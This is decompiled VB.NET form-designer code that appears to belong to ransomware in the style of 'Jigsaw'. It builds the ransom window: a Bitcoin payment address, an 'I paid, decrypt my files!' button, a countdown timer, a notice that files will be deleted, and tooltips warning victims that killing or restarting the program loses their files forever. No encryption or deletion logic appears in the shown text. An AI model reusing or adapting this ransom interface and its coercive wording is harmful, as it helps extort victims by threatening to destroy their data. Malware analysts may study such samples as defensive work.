Namespace Main
	' Token: 0x02000009 RID: 9
	Public NotInheritable Partial Class FormGame
		Inherits Global.System.Windows.Forms.Form

		' Token: 0x06000035 RID: 53 RVA: 0x00004678 File Offset: 0x00002878
		Protected Overrides Sub Dispose(disposing As Boolean)
			If disposing AndAlso Me.components IsNot Nothing Then
				Me.components.Dispose()
			End If
			MyBase.Dispose(disposing)
		End Sub

		' Token: 0x06000036 RID: 54 RVA: 0x000046A8 File Offset: 0x000028A8
		Private Sub InitializeComponent()
			Me.components = New Global.System.ComponentModel.Container()
			Dim componentResourceManager As Global.System.ComponentModel.ComponentResourceManager = New Global.System.ComponentModel.ComponentResourceManager(GetType(Global.Main.FormGame))
			Me.labelWelcome = New Global.System.Windows.Forms.Label()
			Me.timerTypingEffect = New Global.System.Windows.Forms.Timer(Me.components)
			Me.labelTask = New Global.System.Windows.Forms.Label()
			Me.textBoxAddress = New Global.System.Windows.Forms.TextBox()
			Me.buttonCheckPayment = New Global.System.Windows.Forms.Button()
			Me.buttonViewEncryptedFiles = New Global.System.Windows.Forms.Button()
			Me.timerCountDown = New Global.System.Windows.Forms.Timer(Me.components)
			Me.labelCountDown = New Global.System.Windows.Forms.Label()
			Me.labelFilesToDelete = New Global.System.Windows.Forms.Label()
			Me.buttonCopy = New Global.System.Windows.Forms.Button()
			Me.timer1 = New Global.System.Windows.Forms.Timer(Me.components)
			Me.linkLabel1 = New Global.System.Windows.Forms.LinkLabel()
			Me.linkLabel2 = New Global.System.Windows.Forms.LinkLabel()
			Me.label1 = New Global.System.Windows.Forms.Label()
			Me.timer2 = New Global.System.Windows.Forms.Timer(Me.components)
			Me.groupBox1 = New Global.System.Windows.Forms.GroupBox()
			Me.label2 = New Global.System.Windows.Forms.Label()
			Me.groupBox2 = New Global.System.Windows.Forms.GroupBox()
			Me.groupBox3 = New Global.System.Windows.Forms.GroupBox()
			Me.groupBox4 = New Global.System.Windows.Forms.GroupBox()
			Me.visualStyler1 = New Global.SkinSoft.VisualStyler.VisualStyler(Me.components)
			Me.toolTip1 = New Global.System.Windows.Forms.ToolTip(Me.components)
			Me.groupBox1.SuspendLayout()
			Me.groupBox2.SuspendLayout()
			Me.groupBox3.SuspendLayout()
			Me.groupBox4.SuspendLayout()
			Me.visualStyler1.BeginInit()
			MyBase.SuspendLayout()
			Me.labelWelcome.AutoSize = True
			Me.labelWelcome.BackColor = Global.System.Drawing.Color.Transparent
			Me.labelWelcome.Font = New Global.System.Drawing.Font("Lucida Console", 12F, Global.System.Drawing.FontStyle.Bold, Global.System.Drawing.GraphicsUnit.Point, 0)
			Me.labelWelcome.ForeColor = Global.System.Drawing.Color.Black
			Me.labelWelcome.Location = New Global.System.Drawing.Point(137, 29)
			Me.labelWelcome.Name = "labelWelcome"
			Me.labelWelcome.Size = New Global.System.Drawing.Size(239, 16)
			Me.labelWelcome.TabIndex = 0
			Me.labelWelcome.Text = "I want to play a game"
			Me.labelWelcome.Visible = False
			AddHandler Me.timerTypingEffect.Tick, AddressOf Me.timerTypingEffect_Tick
			Me.labelTask.AutoSize = True
			Me.labelTask.BackColor = Global.System.Drawing.Color.Transparent
			Me.labelTask.Font = New Global.System.Drawing.Font("Microsoft Sans Serif", 8.25F)
			Me.labelTask.ForeColor = Global.System.Drawing.Color.Black
			Me.labelTask.Location = New Global.System.Drawing.Point(119, 69)
			Me.labelTask.Name = "labelTask"
			Me.labelTask.Size = New Global.System.Drawing.Size(133, 13)
			Me.labelTask.TabIndex = 1
			Me.labelTask.Text = "Payment Bitcoin Address..."
			Me.textBoxAddress.Location = New Global.System.Drawing.Point(122, 87)
			Me.textBoxAddress.Name = "textBoxAddress"
			Me.textBoxAddress.[ReadOnly] = True
			Me.textBoxAddress.Size = New Global.System.Drawing.Size(243, 20)
			Me.textBoxAddress.TabIndex = 1
			Me.textBoxAddress.TextAlign = Global.System.Windows.Forms.HorizontalAlignment.Center
			Me.toolTip1.SetToolTip(Me.textBoxAddress, "BTC address to make the payment and recover" & vbCrLf & "your files...")
			Me.buttonCheckPayment.Location = New Global.System.Drawing.Point(122, 113)
			Me.buttonCheckPayment.Name = "buttonCheckPayment"
			Me.buttonCheckPayment.Size = New Global.System.Drawing.Size(362, 33)
			Me.buttonCheckPayment.TabIndex = 3
			Me.buttonCheckPayment.Text = "I paid, decrypt my files!"
			Me.toolTip1.SetToolTip(Me.buttonCheckPayment, "Click here when you are done with your payment...")
			Me.buttonCheckPayment.UseVisualStyleBackColor = False
			AddHandler Me.buttonCheckPayment.Click, AddressOf Me.buttonCheckPayment_Click
			Me.buttonViewEncryptedFiles.Location = New Global.System.Drawing.Point(122, 32)
			Me.buttonViewEncryptedFiles.Name = "buttonViewEncryptedFiles"
			Me.buttonViewEncryptedFiles.Size = New Global.System.Drawing.Size(362, 33)
			Me.buttonViewEncryptedFiles.TabIndex = 0
			Me.buttonViewEncryptedFiles.Text = "View encrypted files"
			Me.toolTip1.SetToolTip(Me.buttonViewEncryptedFiles, "List of encrypted files...")
			Me.buttonViewEncryptedFiles.UseVisualStyleBackColor = False
			AddHandler Me.buttonViewEncryptedFiles.Click, AddressOf Me.buttonViewEncryptedFiles_Click
			Me.timerCountDown.Interval = 1000
			AddHandler Me.timerCountDown.Tick, AddressOf Me.timerCountDown_Tick
			Me.labelCountDown.AutoSize = True
			Me.labelCountDown.BackColor = Global.System.Drawing.Color.Transparent
			Me.labelCountDown.Font = New Global.System.Drawing.Font("Lucida Sans Unicode", 50F, Global.System.Drawing.FontStyle.Bold, Global.System.Drawing.GraphicsUnit.Point, 0)
			Me.labelCountDown.Location = New Global.System.Drawing.Point(51, 10)
			Me.labelCountDown.Name = "labelCountDown"
			Me.labelCountDown.Size = New Global.System.Drawing.Size(229, 81)
			Me.labelCountDown.TabIndex = 5
			Me.labelCountDown.Text = "59:59"
			Me.labelCountDown.TextAlign = Global.System.Drawing.ContentAlignment.TopCenter
			Me.toolTip1.SetToolTip(Me.labelCountDown, "Time left before next group of files is erased...")
			Me.labelFilesToDelete.AutoSize = True
			Me.labelFilesToDelete.BackColor = Global.System.Drawing.Color.Transparent
			Me.labelFilesToDelete.Font = New Global.System.Drawing.Font("Microsoft Sans Serif", 8.25F)
			Me.labelFilesToDelete.ForeColor = Global.System.Drawing.Color.Black
			Me.labelFilesToDelete.Location = New Global.System.Drawing.Point(119, 15)
			Me.labelFilesToDelete.Name = "labelFilesToDelete"
			Me.labelFilesToDelete.Size = New Global.System.Drawing.Size(108, 13)
			Me.labelFilesToDelete.TabIndex = 6
			Me.labelFilesToDelete.Text = "1 file will be deleted..."
			Me.buttonCopy.Location = New Global.System.Drawing.Point(371, 87)
			Me.buttonCopy.Name = "buttonCopy"
			Me.buttonCopy.Size = New Global.System.Drawing.Size(113, 20)
			Me.buttonCopy.TabIndex = 2
			Me.buttonCopy.Text = "Copy to Clipboard"
			Me.toolTip1.SetToolTip(Me.buttonCopy, "Copy BTC Address to clipboard...")
			Me.buttonCopy.UseVisualStyleBackColor = False
			AddHandler Me.buttonCopy.Click, AddressOf Me.button1_Click
			Me.timer1.Enabled = True
			AddHandler Me.timer1.Tick, AddressOf Me.timer1_Tick
			Me.linkLabel1.AutoSize = True
			Me.linkLabel1.BackColor = Global.System.Drawing.Color.Transparent
			Me.linkLabel1.Font = New Global.System.Drawing.Font("Microsoft Sans Serif", 8.25F)
			Me.linkLabel1.ForeColor = Global.System.Drawing.Color.Black
			Me.linkLabel1.LinkColor = Global.System.Drawing.Color.White
			Me.linkLabel1.Location = New Global.System.Drawing.Point(77, 68)
			Me.linkLabel1.Name = "linkLabel1"
			Me.linkLabel1.Size = New Global.System.Drawing.Size(112, 13)
			Me.linkLabel1.TabIndex = 8
			Me.linkLabel1.TabStop = True
			Me.linkLabel1.Text = "Where to buy Bitcoin?"
			AddHandler Me.linkLabel1.LinkClicked, AddressOf Me.linkLabel1_LinkClicked
			Me.linkLabel2.AutoSize = True
			Me.linkLabel2.BackColor = Global.System.Drawing.Color.Transparent
			Me.linkLabel2.Font = New Global.System.Drawing.Font("Microsoft Sans Serif", 8.25F)
			Me.linkLabel2.ForeColor = Global.System.Drawing.Color.White
			Me.linkLabel2.LinkColor = Global.System.Drawing.Color.White
			Me.linkLabel2.Location = New Global.System.Drawing.Point(77, 42)
			Me.linkLabel2.Name = "linkLabel2"
			Me.linkLabel2.Size = New Global.System.Drawing.Size(79, 13)
			Me.linkLabel2.TabIndex = 9
			Me.linkLabel2.TabStop = True
			Me.linkLabel2.Text = "About Bitcoin..."
			AddHandler Me.linkLabel2.LinkClicked, AddressOf Me.linkLabel2_LinkClicked
			Me.label1.AutoSize = True
			Me.label1.BackColor = Global.System.Drawing.Color.Transparent
			Me.label1.Font = New Global.System.Drawing.Font("Microsoft Sans Serif", 8.25F)
			Me.label1.ForeColor = Global.System.Drawing.Color.White
			Me.label1.Location = New Global.System.Drawing.Point(77, 20)
			Me.label1.Name = "label1"
			Me.label1.Size = New Global.System.Drawing.Size(99, 13)
			Me.label1.TabIndex = 10
			Me.label1.Text = "1 BTC = 5000 USD"
			Me.toolTip1.SetToolTip(Me.label1, "BTC real time price...")
			Me.timer2.Enabled = True
			Me.timer2.Interval = 180000
			AddHandler Me.timer2.Tick, AddressOf Me.timer2_Tick
			Me.groupBox1.Controls.Add(Me.label2)
			Me.groupBox1.Location = New Global.System.Drawing.Point(12, 12)
			Me.groupBox1.Name = "groupBox1"
			Me.groupBox1.Size = New Global.System.Drawing.Size(603, 115)
			Me.groupBox1.TabIndex = 11
			Me.groupBox1.TabStop = False
			Me.groupBox1.Text = "Important Information"
			Me.label2.AutoSize = True
			Me.label2.Location = New Global.System.Drawing.Point(46, 17)
			Me.label2.Name = "label2"
			Me.label2.Size = New Global.System.Drawing.Size(510, 91)
			Me.label2.TabIndex = 0
			Me.label2.Text = componentResourceManager.GetString("label2.Text")
			Me.toolTip1.SetToolTip(Me.label2, "Readme carefully..." & vbCrLf & "And never ever try to kill me or restart me because my" & vbCrLf & "encryption constant could change with a new restart, " & vbCrLf & "thereby your files would be lost forever!")
			Me.groupBox2.Controls.Add(Me.label1)
			Me.groupBox2.Controls.Add(Me.linkLabel1)
			Me.groupBox2.Controls.Add(Me.linkLabel2)
			Me.groupBox2.Location = New Global.System.Drawing.Point(348, 133)
			Me.groupBox2.Name = "groupBox2"
			Me.groupBox2.Size = New Global.System.Drawing.Size(267, 100)
			Me.groupBox2.TabIndex = 12
			Me.groupBox2.TabStop = False
			Me.groupBox2.Text = "BTC Real Time Price"
			Me.groupBox3.Controls.Add(Me.labelCountDown)
			Me.groupBox3.Location = New Global.System.Drawing.Point(12, 133)
			Me.groupBox3.Name = "groupBox3"
			Me.groupBox3.Size = New Global.System.Drawing.Size(330, 100)
			Me.groupBox3.TabIndex = 13
			Me.groupBox3.TabStop = False
			Me.groupBox3.Text = "Countdown Timer"
			Me.groupBox4.Controls.Add(Me.labelFilesToDelete)
			Me.groupBox4.Controls.Add(Me.labelTask)
			Me.groupBox4.Controls.Add(Me.buttonCopy)
			Me.groupBox4.Controls.Add(Me.textBoxAddress)
			Me.groupBox4.Controls.Add(Me.buttonCheckPayment)
			Me.groupBox4.Controls.Add(Me.buttonViewEncryptedFiles)
			Me.groupBox4.Location = New Global.System.Drawing.Point(12, 239)
			Me.groupBox4.Name = "groupBox4"
			Me.groupBox4.Size = New Global.System.Drawing.Size(603, 161)
			Me.groupBox4.TabIndex = 14
			Me.groupBox4.TabStop = False
			Me.groupBox4.Text = "Payment Information"
			Me.visualStyler1.HostForm = Me
			Me.visualStyler1.License = CType(componentResourceManager.GetObject("visualStyler1.License"), Global.SkinSoft.VisualStyler.Licensing.VisualStylerLicense)
			Me.visualStyler1.LoadVisualStyle(Nothing, "ITunes A (itunesg).vssf")
			Me.toolTip1.IsBalloon = True
			Me.toolTip1.ToolTipTitle = "Help:"
			MyBase.AutoScaleDimensions = New Global.System.Drawing.SizeF(6F, 13F)
			MyBase.AutoScaleMode = Global.System.Windows.Forms.AutoScaleMode.Font
			MyBase.ClientSize = New Global.System.Drawing.Size(631, 414)
			MyBase.Controls.Add(Me.groupBox2)
			MyBase.Controls.Add(Me.groupBox1)
			MyBase.Controls.Add(Me.labelWelcome)
			MyBase.Controls.Add(Me.groupBox3)
			MyBase.Controls.Add(Me.groupBox4)
			MyBase.Icon = CType(componentResourceManager.GetObject("$this.Icon"), Global.System.Drawing.Icon)
			MyBase.KeyPreview = True
			MyBase.MaximizeBox = False
			MyBase.MinimizeBox = False
			MyBase.Name = "FormGame"
			MyBase.StartPosition = Global.System.Windows.Forms.FormStartPosition.CenterScreen
			AddHandler MyBase.FormClosing, AddressOf Me.FormGame_FormClosing
			AddHandler MyBase.Load, AddressOf Me.FormGame_Load
			AddHandler MyBase.KeyDown, AddressOf Me.FormGame_KeyDown
			AddHandler MyBase.MouseDown, AddressOf Me.FormGame_MouseDown
			AddHandler MyBase.MouseMove, AddressOf Me.FormGame_MouseMove
			Me.groupBox1.ResumeLayout(False)
			Me.groupBox1.PerformLayout()
			Me.groupBox2.ResumeLayout(False)
			Me.groupBox2.PerformLayout()
			Me.groupBox3.ResumeLayout(False)
			Me.groupBox3.PerformLayout()
			Me.groupBox4.ResumeLayout(False)
			Me.groupBox4.PerformLayout()
			Me.visualStyler1.EndInit()
			MyBase.ResumeLayout(False)
			MyBase.PerformLayout()
		End Sub

		' Token: 0x04000065 RID: 101
		Private components As Global.System.ComponentModel.IContainer = Nothing

		' Token: 0x04000066 RID: 102
		Private labelWelcome As Global.System.Windows.Forms.Label

		' Token: 0x04000067 RID: 103
		Private timerTypingEffect As Global.System.Windows.Forms.Timer

		' Token: 0x04000068 RID: 104
		Private labelTask As Global.System.Windows.Forms.Label

		' Token: 0x04000069 RID: 105
		Private textBoxAddress As Global.System.Windows.Forms.TextBox

		' Token: 0x0400006A RID: 106
		Private buttonViewEncryptedFiles As Global.System.Windows.Forms.Button

		' Token: 0x0400006B RID: 107
		Private timerCountDown As Global.System.Windows.Forms.Timer

		' Token: 0x0400006C RID: 108
		Private labelCountDown As Global.System.Windows.Forms.Label

		' Token: 0x0400006D RID: 109
		Private labelFilesToDelete As Global.System.Windows.Forms.Label

		' Token: 0x0400006E RID: 110
		Private buttonCopy As Global.System.Windows.Forms.Button

		' Token: 0x0400006F RID: 111
		Private timer1 As Global.System.Windows.Forms.Timer

		' Token: 0x04000070 RID: 112
		Private linkLabel1 As Global.System.Windows.Forms.LinkLabel

		' Token: 0x04000071 RID: 113
		Private linkLabel2 As Global.System.Windows.Forms.LinkLabel

		' Token: 0x04000072 RID: 114
		Private timer2 As Global.System.Windows.Forms.Timer

		' Token: 0x04000073 RID: 115
		Public label1 As Global.System.Windows.Forms.Label

		' Token: 0x04000074 RID: 116
		Private groupBox1 As Global.System.Windows.Forms.GroupBox

		' Token: 0x04000075 RID: 117
		Private label2 As Global.System.Windows.Forms.Label

		' Token: 0x04000076 RID: 118
		Private groupBox3 As Global.System.Windows.Forms.GroupBox

		' Token: 0x04000077 RID: 119
		Private groupBox2 As Global.System.Windows.Forms.GroupBox

		' Token: 0x04000078 RID: 120
		Private groupBox4 As Global.System.Windows.Forms.GroupBox

		' Token: 0x04000079 RID: 121
		Public buttonCheckPayment As Global.System.Windows.Forms.Button

		' Token: 0x0400007A RID: 122
		Private visualStyler1 As Global.SkinSoft.VisualStyler.VisualStyler

		' Token: 0x0400007B RID: 123
		Private toolTip1 As Global.System.Windows.Forms.ToolTip
	End Class
End Namespace
